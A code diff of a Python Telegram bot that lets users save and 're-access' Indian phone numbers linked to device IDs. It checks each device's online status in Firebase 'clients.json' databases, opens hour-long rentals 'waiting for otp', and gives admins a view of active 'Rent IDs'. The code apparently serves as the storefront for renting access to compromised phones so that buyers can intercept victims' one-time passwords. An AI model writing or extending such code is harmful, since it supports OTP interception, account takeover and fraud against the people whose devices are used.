+        f"🔗 <b>{sc('source url')}:</b>\n<code>{lease.get('fb_url', 'Unknown')}</code>"
+    )
+    await cq.answer(info_text, show_alert=True)
+
+@router.callback_query(F.data.startswith("save:"))
+async def save_number(cq: CallbackQuery):
+    dev_id = cq.data.split(":")[1]
+    uid = cq.from_user.id
+    d = db.load_data()
+    lease = d.get("user_leases", {}).get(str(uid), {})
+    
+    if not lease or lease.get("dev_id") != dev_id:
+        return await cq.answer("❌ Lease expired!")
+        
+    nums = lease.get("numbers", [])
+    save_key = nums[0] if nums else dev_id
+    base_label = lease.get("base_idx", "Base ?")
+    
+    user = d["users"].setdefault(str(uid), {})
+    saved = user.setdefault("saved_numbers", {})
+    
+    saved[save_key] = {
+        "dev_id": dev_id, "fb_url": lease["fb_url"], "base_idx": base_label,
+        "health": lease.get("health"), "time": int(time.time())
+    }
+    db.save_data(d)
+    await cq.answer("⭐ Saved to My Numbers!")
+
+@router.callback_query(F.data == "user:saved")
+async def my_numbers(cq: CallbackQuery):
+    uid = cq.from_user.id
+    d = db.load_data()
+    saved = d.get("users", {}).get(str(uid), {}).get("saved_numbers", {})
+    
+    if not saved:
+        return await cq.message.edit_text("⭐ <b>My Numbers</b>\n\nNo saved numbers.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("main menu", "user:home", "🏠")]]), parse_mode="HTML")
+        
+    kb = []
+    for key, info in saved.items():
+        disp = f"+91{key}" if len(key) == 10 else key
+        kb.append([btn(f"{disp} | {info.get('base_idx', '')}", f"access:{key}", "📞")])
+    kb.append([btn("main menu", "user:home", "🏠")])
+    
+    await cq.message.edit_text("⭐ <b>My Numbers</b>\nTap to re-access:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
+
+@router.callback_query(F.data.startswith("access:"))
+async def access_saved(cq: CallbackQuery):
+    key = cq.data.split(":")[1]
+    uid = cq.from_user.id
+    d = db.load_data()
+    saved = d.get("users", {}).get(str(uid), {}).get("saved_numbers", {})
+    
+    if key not in saved: return await cq.answer("Not found!")
+    info = saved[key]
+    
+    if time.time() - info["time"] > 86400:
+        del saved[key]
+        db.save_data(d)
+        return await cq.answer("❌ 24 hours complete. Number expired.", show_alert=True)
+        
+    dev_id = info["dev_id"]
+    fb_url = info["fb_url"]
+    
+    clients = await fbu.fetch_fb(f"{fb_url}/clients.json")
+    is_online = clients and dev_id in clients and clients[dev_id].get("status") is True
+    
+    if not is_online:
+        # ONLY offline check, no health check
+        return await cq.answer("❌ Device offline or removed. Not in range, try after some time.", show_alert=True)
+        
+    d["user_leases"][str(uid)] = {
+        "dev_id": dev_id, "fb_url": fb_url, "base_idx": info.get("base_idx", "Unknown"), "numbers": [key] if len(key)==10 else [], "expire_at": int(time.time()) + 3600, "health": info.get("health", 5)
+    }
+    db.save_data(d)
+    
+    text = (
+        f"📱 <b>{sc('re-accessed device')}</b>\n"
+        f"🆔 {sc('rent id')}: <code>{dev_id}</code>\n"
+        f"📁 {sc('base')}: {info.get('base_idx', 'Unknown')}\n"
+        f"📞 {sc('number')}: <code>+91{key}</code>\n\n"
+        f"⌛ <i>{sc('waiting for otp (1 hour)')}...</i>"
+    )
+    kb = [
+        [InlineKeyboardButton(text="📋 Copy Rent ID", copy_text=CopyTextButton(text=dev_id))],
+        [btn("stop", "stop_listen", "⏹")],
+        [btn("main menu", "user:home", "🏠")]
+    ]
+    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
 
 @router.callback_query(F.data == "stop_listen")
 async def stop_listening(cq: CallbackQuery):
     clear_user_lease(cq.from_user.id)
-    await cq.answer("⏹ Listening stopped successfully.", show_alert=True)
+    await cq.answer("⏹ Stopped.", show_alert=True)
     await user_home(cq)
 
+# ================= EXTRA ADMIN FEATURES =================
+@router.callback_query(F.data == "admin:analytics")
+async def admin_analytics(cq: CallbackQuery):
+    d = db.load_data()
+    leases = d.get("user_leases", {})
+    text = "📊 <b>Active Rent IDs</b>\n\n"
+    for uid, l in leases.items():
+        if time.time() < l["expire_at"]:
+            text += f"👤 <code>{uid}</code> | 🆔 <code>{l['dev_id']}</code> | {l.get('base_idx')}\n"
+    if len(text) == 26: text += "No active leases."
+    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("back", "admin:home", "🔙")]]), parse_mode="HTML")
+
+@router.callback_query(F.data == "user:support")
+async def user_support(cq: CallbackQuery, state: FSMContext):
+    await state.set_state(S.support_msg)
+    await cq.message.edit_text("🆘 <b>Support</b>\n\nType your message for owner:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("cancel", "user:home", "❌")]]), parse_mode="HTML")
+
+@router.message(S.support_msg)
+async def support_msg_sent(msg: Message, state: FSMContext):
+    await state.clear()
+    try:
+        await msg.bot.send_message(MAIN_OWNER, f"🆘 <b>Support Msg</b>\nFrom: <code>{msg.from_user.id}</code>\n\n{msg.text}", parse_mode="HTML")
+        await msg.answer("✅ Message sent to owner!", reply_markup=main_kb())
+    except: await msg.answer("❌ Failed to send.")
+
+# ================= MAIN =================
 async def main():
-    log.info("Bot Started!")
+    log.info("Starting Bot...")
     app = web.Application()
-    app.router.add_get('/', lambda r: web.Response(text="Bot is running!"))
+    app.router.add_get('/', lambda r: web.Response(text="Bot Running!"))
     runner = web.AppRunner(app)
     await runner.setup()
-    site = web.TCPSite(runner, '0.0.0.0', PORT)
-    await site.start()
-    main_bot = Bot(token=BOT_TOKEN)
-    running_bots[BOT_TOKEN] = main_bot
+    await web.TCPSite(runner, '0.0.0.0', PORT).start()
+    
+    bot = Bot(token=BOT_TOKEN)
+    running_bots[BOT_TOKEN] = bot
     asyncio.create_task(background_scanner())
+    
     dp = Dispatcher(storage=MemoryStorage())
     dp.include_router(router)
-    await dp.start_polling(main_bot)
+    await dp.start_polling(bot)
 
 if __name__ == "__main__":
     asyncio.run(main())
